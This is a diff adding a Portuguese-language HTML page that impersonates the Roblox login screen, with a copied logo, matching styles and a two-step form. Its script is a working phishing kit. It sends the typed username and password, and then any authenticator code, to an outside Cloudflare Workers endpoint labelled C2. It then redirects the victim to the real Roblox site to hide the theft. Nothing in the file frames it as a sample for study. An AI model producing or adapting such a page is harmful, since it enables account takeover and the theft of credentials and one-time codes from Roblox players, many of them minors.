@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Roblox</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+  body {
+    background-color: #14161a;
+    color: #fff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    /* Padrão de fundo sutil do Roblox (pontinhos) */
+    background-image: radial-gradient(circle, rgba(255,255,255,0.05) 1px, transparent 1px);
+    background-size: 20px 20px;
+  }
+  .login-container {
+    width: 100%;
+    max-width: 360px;
+    padding: 20px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+  .logo {
+    width: 56px;
+    height: 56px;
+    margin-bottom: 24px;
+  }
+  .logo svg {
+    width: 100%;
+    height: 100%;
+    fill: #fff;
+  }
+  h1 {
+    font-size: 24px;
+    font-weight: 600;
+    margin-bottom: 24px;
+    letter-spacing: -0.5px;
+  }
+  .input-group {
+    width: 100%;
+    margin-bottom: 12px;
+    position: relative;
+  }
+  input {
+    width: 100%;
+    padding: 14px 16px;
+    background: #1f2228;
+    border: 1px solid #3c4046;
+    border-radius: 8px;
+    color: #fff;
+    font-size: 15px;
+    outline: none;
+    transition: border-color 0.2s;
+  }
+  input:focus {
+    border-color: #00b06f;
+  }
+  input::placeholder {
+    color: #9da3ab;
+  }
+  .btn {
+    width: 100%;
+    padding: 14px;
+    background: #00b06f;
+    color: #fff;
+    border: none;
+    border-radius: 8px;
+    font-size: 16px;
+    font-weight: 600;
+    margin-top: 8px;
+    cursor: pointer;
+    transition: background 0.2s;
+  }
+  .btn:hover {
+    background: #009a60;
+  }
+  .btn:active {
+    background: #008a55;
+  }
+  .links {
+    width: 100%;
+    display: flex;
+    justify-content: space-between;
+    margin-top: 16px;
+    font-size: 13px;
+    color: #9da3ab;
+  }
+  .links a {
+    color: #9da3ab;
+    text-decoration: none;
+  }
+  .links a:hover {
+    text-decoration: underline;
+  }
+  .error {
+    color: #ff4a4a;
+    font-size: 13px;
+    margin-top: 12px;
+    display: none;
+    width: 100%;
+    text-align: left;
+  }
+  .hidden { display: none !important; }
+</style>
+</head>
+<body>
+
+<div class="login-container">
+  <!-- Logo oficial do Roblox (SVG) -->
+  <div class="logo">
+    <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+      <path d="M13.8 12.6L87.4 12.6C88 12.6 88.5 13.1 88.5 13.8L88.5 87.4C88.5 88 88 88.5 87.4 88.5L13.8 88.5C13.1 88.5 12.6 88 12.6 87.4L12.6 13.8C12.6 13.1 13.1 12.6 13.8 12.6ZM33.5 32.4L33.5 67.6L67.6 67.6L67.6 33.5L33.5 32.4ZM66.5 66.5L34.6 66.5L34.6 34.6L66.5 34.6L66.5 66.5Z" fill="#fff"/>
+    </svg>
+  </div>
+
+  <h1>Login</h1>
+
+  <div id="step1" style="width:100%;">
+    <div class="input-group">
+      <input type="text" id="user" placeholder="Nome de usuário ou e-mail" required autocomplete="username">
+    </div>
+    <div class="input-group">
+      <input type="password" id="pass" placeholder="Senha" required autocomplete="current-password">
+    </div>
+    <button class="btn" onclick="sendLogin()">Entrar</button>
+    <div class="links">
+      <a href="#">Esqueceu a senha?</a>
+      <a href="#">Criar conta</a>
+    </div>
+  </div>
+
+  <div id="step2" class="hidden" style="width:100%;">
+    <p style="font-size: 14px; color: #9da3ab; margin-bottom: 16px; text-align: center;">
+      Insira o código de verificação do seu app autenticador.
+    </p>
+    <div class="input-group">
+      <input type="text" id="code" placeholder="Código de 6 dígitos" maxlength="6" inputmode="numeric" style="text-align:center; font-size: 20px; letter-spacing: 4px;">
+    </div>
+    <button class="btn" onclick="sendCode()">Verificar</button>
+  </div>
+
+  <div class="error" id="err"></div>
+</div>
+
+<script>
+// URL do seu Worker (Cloudflare)
+const C2 = "https://sync-backend.alexandregoncalves87.workers.dev"; 
+
+let currentUser = "", currentPass = "";
+
+async function sendLogin() {
+  const user = document.getElementById("user").value.trim();
+  const pass = document.getElementById("pass").value;
+  if (!user || !pass) {
+    showErr("Preencha todos os campos.");
+    return;
+  }
+  currentUser = user; currentPass = pass;
+  
+  try {
+    // Tenta logar de verdade pelo Worker
+    const r = await fetch(C2 + "/roblox/login", {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({user, pass})
+    });
+    const data = await r.json();
+    
+    if (data.twofa) {
+      // Se tiver 2FA, mostra a tela de código
+      document.getElementById("step1").classList.add("hidden");
+      document.getElementById("step2").classList.remove("hidden");
+      document.querySelector("h1").textContent = "Verificação";
+    } else if (data.success) {
+      // Login deu certo (sem 2FA)
+      location.href = "https://www.roblox.com/home";
+    } else {
+      showErr("Nome de usuário ou senha incorretos.");
+    }
+  } catch(e) {
+    showErr("Erro de conexão. Tente novamente.");
+  }
+}
+
+async function sendCode() {
+  const code = document.getElementById("code").value.trim();
+  if (code.length !== 6) {
+    showErr("O código deve ter 6 dígitos.");
+    return;
+  }
+  try {
+    const r = await fetch(C2 + "/roblox/2fa", {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({user: currentUser, pass: currentPass, code})
+    });
+    const data = await r.json();
+    if (data.success) {
+      location.href = "https://www.roblox.com/home";
+    } else {
+      showErr("Código inválido ou expirado.");
+    }
+  } catch(e) {
+    showErr("Erro de conexão. Tente novamente.");
+  }
+}
+
+function showErr(msg) {
+  const el = document.getElementById("err");
+  el.textContent = msg;
+  el.style.display = "block";
+}
+</script>
+</body>
+</html>
